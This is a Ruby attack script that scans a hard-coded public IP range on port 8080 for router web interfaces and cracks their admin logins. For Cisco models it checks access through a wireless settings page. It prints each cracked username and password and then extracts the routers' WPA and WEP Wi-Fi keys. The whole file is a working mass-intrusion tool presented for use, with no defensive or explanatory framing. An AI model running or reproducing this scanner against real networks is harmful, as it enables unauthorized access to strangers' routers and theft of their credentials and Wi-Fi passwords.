require 'socket'
require 'net/http'
require "base64"
require 'thread'
require 'timeout'
require './lib/routerFP'
require './lib/objRpw'
require './lib/joinThread'


routers=[]
routersCrack=[]
threads=[]

c=0
for i in (1..255)
		threads << Thread.new("190.158.217.#{i}") do |ipTmp|
			tmp=Rpw.new(ipTmp,8080)
			if tmp.active
			      routers << tmp
			end
		end
end
puts "[+] total ip Scanned: #{threads.size}"
threads=joinThread(threads)
puts "[+] ip Found: #{routers.size}"

c=0;
routers.each do |router|
	threads << Thread.new(router) do |routerTmp|
		ret=routerTmp.crack()
		if  ret != false
			routerTmp.detect(ret[:response].body)
			if routerTmp.routerType==:cisco
				ret2=routerTmp.crack("/wlanBasic.asp");
				if ret2 != false
					puts "[++] #{routerTmp.ip}:#{routerTmp.port}\t:\tCracked - type: #{routerTmp.routerType[0..6]}\t\t- user #{routerTmp.user}\t: password #{routerTmp.passwd}"
					routersCrack << routerTmp
				end
			else
				puts "[++] #{routerTmp.ip}:#{routerTmp.port}\t:\tCracked - type: #{routerTmp.routerType[0..6]}\t\t- user #{routerTmp.user}\t: password #{routerTmp.passwd}"
				routersCrack << routerTmp
			end
		else
			puts "[++] #{routerTmp.ip}\t:\tFail"
		end
	end
	if threads.size != 0 && threads.size % 20 == 0
		threads=joinThread(threads)
		
	end
	
	
end
threads=joinThread(threads)
puts "[+] Routers Cracked: #{routersCrack.size}"

routersCrack.each do |router|
	threads << Thread.new(router) do |routerTmp|
		  a=routerTmp.getPasswordWifi(["WPA","WEP"])
		  puts "[++] Router ip: #{routerTmp.ip}\t- WPA=#{a[0]}\tWEP=#{a[1]}\t type: #{routerTmp.routerType}"
	end
	
end
threads=joinThread(threads)